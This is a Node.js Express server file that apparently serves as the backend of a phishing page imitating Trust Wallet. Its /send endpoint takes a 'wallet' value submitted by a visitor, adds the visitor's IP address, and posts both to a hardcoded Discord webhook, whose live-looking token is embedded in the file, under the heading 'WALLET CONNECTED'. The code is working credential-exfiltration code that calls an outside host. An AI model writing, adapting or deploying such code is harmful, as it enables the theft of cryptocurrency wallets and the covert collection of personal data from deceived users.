const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// ⭐⭐⭐ PUT YOUR DISCORD WEBHOOK HERE ⭐⭐⭐
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1459213607219892245/M_dBdrlpBILx4BNIW3mfxfnc7EHPxXNSe9xNArkl4q_3dc6_ejbKy0ojgRJ4yoeozfVp";

// Serve static files
app.use(express.static(__dirname));

// Root route
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// API endpoint
app.get('/send', async (req, res) => {
    try {
        const wallet = req.query.wallet;
        const ip = req.headers['x-forwarded-for'] || req.ip || 'Unknown';
        
        if (!wallet) {
            return res.json({ error: 'No wallet' });
        }
        
        // Send to Discord
        if (DISCORD_WEBHOOK.includes('discord.com')) {
            const msg = {
                content: "🚨 **WALLET CONNECTED** 🚨",
                embeds: [{
                    title: "Trust Wallet",
                    color: 65280,
                    fields: [
                        { name: "Wallet", value: wallet },
                        { name: "IP", value: ip },
                        { name: "Time", value: new Date().toLocaleString() }
                    ]
                }]
            };
            
            await axios.post(DISCORD_WEBHOOK, msg);
            console.log('Sent to Discord:', wallet, ip);
        }
        
        res.json({ success: true });
        
    } catch (error) {
        console.error(error);
        res.json({ error: error.message });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running: http://localhost:${PORT}`);
});
